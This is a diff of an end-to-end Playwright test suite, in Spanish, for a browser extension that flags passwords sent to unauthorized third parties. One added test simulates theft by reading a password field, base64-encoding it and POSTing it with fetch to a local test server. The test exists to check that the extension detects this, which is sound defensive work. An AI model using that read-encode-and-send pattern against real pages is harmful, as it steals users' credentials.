@@ -39,8 +39,15 @@ let [worker] = context.serviceWorkers();
 if (!worker) worker = await context.waitForEvent("serviceworker");
 const extensionId = new URL(worker.url()).host;
 
+/** Service Worker actual de la extensión: tras un reinicio, el objeto anterior ya no sirve. */
+async function liveWorker() {
+  const prefix = `chrome-extension://${extensionId}/`;
+  const current = context.serviceWorkers().find((w) => w.url().startsWith(prefix));
+  return current ?? context.waitForEvent("serviceworker", { timeout: 15_000 });
+}
+
 async function tabIdOf(url) {
-  return worker.evaluate(async (u) => {
+  return (await liveWorker()).evaluate(async (u) => {
     const tabs = await chrome.tabs.query({});
     return tabs.find((t) => t.url === u)?.id ?? null;
   }, url);
@@ -57,6 +64,7 @@ function unique(url) {
 async function runScenario(url, { submit = "click", beforeTyping } = {}) {
   const page = await context.newPage();
   await page.goto(unique(url));
+  const tabId = await tabIdOf(page.url());
   if (beforeTyping) await beforeTyping(page);
   await page.click('input[name="usuario"]');
   await page.keyboard.type("ana.prueba");
@@ -65,7 +73,7 @@ async function runScenario(url, { submit = "click", beforeTyping } = {}) {
   if (submit === "click") await page.click('button[type="submit"]');
   else await page.keyboard.press("Enter"); // envío inmediato, sin esperar los 300 ms
   await page.waitForTimeout(1200);
-  return { page, tabId: await tabIdOf(page.url()) };
+  return { page, tabId };
 }
 
 async function popupFor(tabId, name) {
@@ -87,7 +95,7 @@ async function popupFor(tabId, name) {
 }
 
 async function badgeOf(tabId) {
-  return worker.evaluate(
+  return (await liveWorker()).evaluate(
     async (id) => ({
       text: await chrome.action.getBadgeText({ tabId: id }),
       color: await chrome.action.getBadgeBackgroundColor({ tabId: id }),
@@ -204,6 +212,50 @@ await check("Escribir solo en un campo de texto normal no genera eventos (CA-P7)
   await page.waitForTimeout(1200);
   const { rows } = await popupFor(await tabIdOf(page.url()), "solo-usuario");
   assert.equal(rows.length, 0, JSON.stringify(rows));
+  await page.close();
+});
+
+await check("Los eventos sobreviven a un reinicio del Service Worker (CA-U8)", async () => {
+  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo`);
+  const cdp = await context.newCDPSession(page);
+  await cdp.send("ServiceWorker.enable");
+  await cdp.send("ServiceWorker.stopAllWorkers");
+  await page.waitForTimeout(1500);
+  const { rows } = await popupFor(tabId, "tras-reinicio");
+  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"), JSON.stringify(rows));
+  await page.close();
+});
+
+await check("El ícono sigue en rojo tras navegar a otra página (CA-U9)", async () => {
+  const { page, tabId } = await runScenario(`${TIENDA}/?escenario=robo-navega`);
+  await page.waitForURL("**/bienvenida.html");
+  await page.waitForTimeout(800);
+  await page.screenshot({ path: path.join(evidence, "robo-navega-pagina.png") });
+  assert.deepEqual(await badgeOf(tabId), { text: "1", color: RED });
+  const { rows } = await popupFor(tabId, "robo-navega");
+  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"));
+  await page.close();
+});
+
+await check("Envío por JavaScript más de 30 s después de escribir (CA-P8)", async () => {
+  const page = await context.newPage();
+  await page.goto(unique(`${TIENDA}/?escenario=limpio`));
+  const tabId = await tabIdOf(page.url());
+  await page.click('input[type="password"]');
+  await page.keyboard.type(PASSWORD, { delay: 20 });
+  await page.click("h1"); // pierde el foco: primer envío de huellas
+  await page.waitForTimeout(33_000); // las huellas caducan a los 30 s
+  await page.click("h1"); // clic de confianza: refresco de huellas
+  await page.evaluate((metrics) => {
+    const clave = document.querySelector('input[type="password"]').value;
+    return fetch(`${metrics}/recibir/js`, {
+      method: "POST",
+      body: JSON.stringify({ c: btoa(clave) }),
+    });
+  }, `http://127.0.0.1:${PORT}`);
+  await page.waitForTimeout(1000);
+  const { rows } = await popupFor(tabId, "envio-tardio");
+  assert.ok(verdicts(rows).includes("Enviada a un tercero no autorizado"), JSON.stringify(rows));
   await page.close();
 });
 
